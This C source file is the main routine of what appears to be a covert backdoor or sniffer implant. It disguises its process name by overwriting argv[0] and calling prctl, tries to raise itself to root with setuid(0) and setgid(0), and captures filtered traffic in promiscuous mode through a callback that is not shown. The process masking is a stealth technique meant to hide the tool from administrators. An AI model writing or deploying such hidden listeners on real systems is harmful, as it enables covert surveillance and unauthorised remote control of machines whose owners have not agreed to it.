#include <sys/prctl.h>
#include "config.h"
#include "raw_socket.h"

int main(int argc,char **argv) {
    /* mask the process name */
	memset(argv[0], 0, strlen(argv[0]));	
	strcpy(argv[0], MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);
	/* change the UID/GID to 0 (raise privs) */
	setuid(0);
	setgid(0);

    if(geteuid() !=0) {
        printf("[-]You need to be root to run this.\n\n");
        exit(0);
    }

	/* setup packet capturing */
	int interfaces = 0; 
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t* nic; 			// interface
	pcap_t* nic_descr;
	struct bpf_program fp;      // holds compiled program     
	bpf_u_int32 maskp;          // subnet mask               
	bpf_u_int32 netp;           // ip                        
	u_char* args = NULL;

	// find the first NIC that is up and sniff packets from it    	
	interfaces = pcap_findalldevs(&nic, errbuf);
	if (interfaces == -1) { 
		printf("[-]%s\n",errbuf); 
		exit(1);
	}

	// Use pcap to get the IP address and subnet mask of the device 
	pcap_lookupnet (nic->name, &netp, &maskp, errbuf);

	// open the device for packet capture & set the device in promiscuous mode 
	nic_descr = pcap_open_live (nic->name, BUFSIZ, 1, -1, errbuf);
	if (nic_descr == NULL) { 
		printf("[-]pcap_open_live(): %s\n",errbuf); 
		exit(1); 
	}
    	
	// Compile the filter expression
	if (pcap_compile (nic_descr, &fp, FILTER, 0, netp) == -1) { 
		fprintf(stderr,"[-]Error calling pcap_compile\n"); 
		exit(1);
	}

	// Load the filter into the capture device
	if (pcap_setfilter (nic_descr, &fp) == -1) { 
		fprintf(stderr,"[-]Error setting filter\n"); 
		exit(1); 
	}
	
    fprintf(stdout,"[+]Start packet sniffing...\n");
	// Start the capture session 
	pcap_loop (nic_descr, 0, pkt_callback, args);

    return 0;
}
